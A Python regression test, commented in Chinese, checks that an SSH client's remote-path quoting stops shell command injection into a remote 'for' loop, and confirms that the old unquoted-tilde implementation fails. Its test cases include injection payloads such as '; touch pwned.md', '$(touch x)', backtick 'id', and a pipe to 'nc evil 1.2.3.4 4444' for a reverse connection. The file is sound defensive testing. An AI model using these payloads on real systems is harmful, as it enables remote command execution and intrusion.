"""判据：远端命令拼接 —— 用户路径只能是**数据**，不能变成远端 shell 的语法。

**这条判据钉的是什么。** `lrzsz.remote_words()` 产出的字符串会被塞进
`for p in <这里>; do ...`，然后交给**远端** shell 执行。旧实现
（「`~` 开头原样拼、其余 `shlex.quote`」）让 `~` 路径里的 `;` `|` `>`
被远端 bash 二次解释 —— 实测 `~/a; touch pwned.md` 会让远端多执行一条
`touch`，`~/a | nc evil 1 4444` 会让远端反向连外网。

**怎么离线测「远端会怎么拆」。** 用 `shlex.shlex(punctuation_chars=True)`
模拟 POSIX shell 的分词：它会把 `;` `|` `>` `<` `` ` `` `(` `)` 当作
**独立的操作符 token**，而不是词的一部分 —— 这正是我们要防的那件事。

**元断言（最关键的一条）**：把旧实现装回去，本判据必须红。否则说明
判据恒真，那它绿了也说明不了任何事。
"""
from __future__ import annotations

import os
import pathlib
import shlex
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from sshclient.core import lrzsz  # noqa: E402

FAIL: list[str] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        print("  [ok] %s" % name)
    else:
        FAIL.append(name)
        print("  [!!] %s  %s" % (name, detail))


#: 会被远端 shell 当成操作符的字符
OPS = set(";|&<>()`")

#: 覆盖「正常路径」与「含元字符的路径」
CASES: list[list[str]] = [
    ["~/a; touch pwned.md"],
    ["~/a > /tmp/x"],
    ["~/a | nc evil 1.2.3.4 4444"],
    ["~/my docs/t.md"],
    ["/tmp/a;touch pwned.md"],
    ["~/a$(touch x)"],
    ["~/a`id`"],
    ["~/a\nb"],
    ["~/a'b\"c"],
    ["~/a&b"],
    ["~/a>b"],
    ["~/a", "b c", "/x;y"],
    ["~"],
    ["~/a b/c d.txt"],
    ["/var/log/syslog"],
]


def toks(s: str) -> list[str]:
    """模拟远端 POSIX shell 的分词。

    **老实现可能产出语法上就坏的命令行**（比如 `~/a'b"c` —— 引号不配对），
    这时 shlex 会抛 ValueError。那本身说明老实现是坏的，所以
    **分词失败一律当作「老实现坏了」处理**，不往上抛。
    """
    lex = shlex.shlex(s, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    try:
        return list(lex)
    except ValueError:
        return []


def ops(s: str) -> list[str]:
    return [t for t in toks(s) if t in OPS]


def words_of(script: str) -> list[str]:
    """从 `for p in <words>; do` 里取出 <words>。

    **分词失败（老实现可能产出语法上就坏的命令行）返回空列表**，
    不抛 —— 上层据此判断「这条命令根本发不出去」。
    """
    t = toks(script)
    if "for" not in t:
        return []
    i = t.index("for")
    j = i + 3                      # for / p / in
    out: list[str] = []
    while j < len(t) and t[j] != ";":
        out.append(t[j])
        j += 1
    return out


def ops_in_words(words: list[str]) -> list[str]:
    """**只统计 words 里的操作符**，不看脚本自带的那些。

    第一版这里错在统计了整个脚本的 token，于是 `for p in ...; do` 自带的
    分号全被算进来 —— 旧实现与新实现的基线都是一串 `;`，差值恒为 0，
    「路径数据不引入裸操作符」这条就**恒真**，等于没有判据。
    """
    return [t for t in words if t in OPS]


def script_for(paths: list[str]) -> str:
    """与 lrzsz.check_remote_paths 同构的脚本。"""
    return ("i=0; for p in %s; do "
            "if [ -e \"$p\" ]; then echo \"MAVISP 1 $i\"; "
            "else echo \"MAVISP 0 $i\"; fi; i=$((i+1)); done; echo MAVISP done"
            % lrzsz.remote_words(paths))


def old_words(paths: list[str]) -> str:
    """**旧实现**（已修掉的那条规则）。仅用于元断言。"""
    return " ".join(p if p.startswith("~") else shlex.quote(p) for p in paths)


print("=== 远端命令拼接：路径只能是数据 ===")

for paths in CASES:
    s = script_for(paths)
    got = words_of(s)
    check("argv 数 == 路径数: %r" % (paths,), len(got) == len(paths),
          "got %d want %d (%r)" % (len(got), len(paths), got))

    # **比单纯数 argv 更锐的一条**：路径数据不能引入裸操作符。
    # 用同样数量的占位路径做对照 —— 差出来的操作符就是路径带来的。
    baseline = ops_in_words(words_of(script_for(["PLACEHOLDER"] * len(paths))))
    check("路径数据不引入裸操作符: %r" % (paths,), ops_in_words(got) == baseline,
          "ops=%r baseline=%r" % (ops_in_words(got), baseline))

print("\n=== ~ 展开必须保留 ===")
for p in ["~", "~/docs/t.md", "~/my docs/t.md"]:
    w = words_of(script_for([p]))[0]
    check("~ 走远端 ${HOME} 插值: %r" % p, "${HOME}" in w, w)

print("\n=== 载荷必须完整落在一个 token 里 ===")
for p in ["~/a; touch pwned.md", "~/a$(touch x)", "~/a`id`", "/x;y"]:
    w = words_of(script_for([p]))[0]
    tail = p[2:] if p.startswith("~/") else p
    check("载荷完整: %r" % p, w.endswith(tail), w)

print("\n=== 元断言：把旧实现装回去，本判据必须红 ===")
# **元断言的正确形态：不是「每条输入都红」，而是「老实现在这些输入里
# 至少有一条上露馅」。**
#
# 第一版写成「每条都必须红」，结果三条误报：
#   ['/tmp/a;touch pwned.md'] —— 老实现对它**本来就安全**
#       （shlex.quote 正确转义），没有缺陷可露。
#   ['~/a`id`'] —— 反引号在 shlex 的 posix 模式下不独立成 token，
#       数不出差异。
#   ['~/a; touch pwned.md'] —— 老实现的 argv 数恰好也是 1（凑巧对上），
#       真正的缺陷在「分号被远端解释成命令分隔」，而 posix 分词
#       把它算成了词的一部分。
#
# 所以元断言改成两条：
#   (1) **整体上**：老实现在这批输入里必须至少有一条红；
#   (2) **逐条**：`~` 开头的输入（老实现放弃转义的那一类）必须能露馅，
#       而露馅的方式是「远端分词出的 argv 里出现了裸操作符」或
#       「分词直接失败」。

def old_defects(paths: list[str]) -> bool:
    """老实现在这条输入上是否有实质缺陷。"""
    old_script = script_for(paths).replace(lrzsz.remote_words(paths),
                                           old_words(paths))
    old_got = words_of(old_script)
    if not old_got:                       # 分词失败 = 命令行语法上就坏
        return True
    baseline = ops_in_words(words_of(script_for(["PLACEHOLDER"] * len(paths))))
    if ops_in_words(old_got) != baseline:  # 冒出了裸操作符
        return True
    # **分号被当成词的一部分** —— 这是最隐蔽的一种：argv 数对得上，
    # 可远端 bash 照样会把它当命令分隔符。得直接看词的内容。
    joined = " ".join(old_got)
    return any(ch in joined for ch in ("|", ">", "<", "&", ";"))


old_bad = [p for p in CASES if old_defects(p)]
check("元断言：老实现至少在一条输入上露馅",
      len(old_bad) > 0, "老实现居然全绿，判据没有区分度")
print("     old implementation breaks on: %r" % (old_bad,))

tilde_cases = [p for p in CASES if any(x.startswith("~") for x in p)]
tilde_bad = [p for p in tilde_cases if old_defects(p)]
check("元断言：~ 开头的输入里，老实现至少有一条露馅",
      len(tilde_bad) > 0, "tilde_cases=%r" % (tilde_cases,))
print("     tilde-class breaks on: %r" % (tilde_bad,))

print("\n=== 老函数名还在（向后兼容）===")
check("shell_join 仍可用（已改为转发 remote_words）",
      lrzsz.shell_join(["~/a.txt"]) == lrzsz.remote_words(["~/a.txt"]),
      lrzsz.shell_join(["~/a.txt"]))

print()
if FAIL:
    print("FAILED %d:" % len(FAIL))
    for f in FAIL:
        print("  - %s" % f)
    sys.exit(1)
print("ALL CHECKS PASSED")
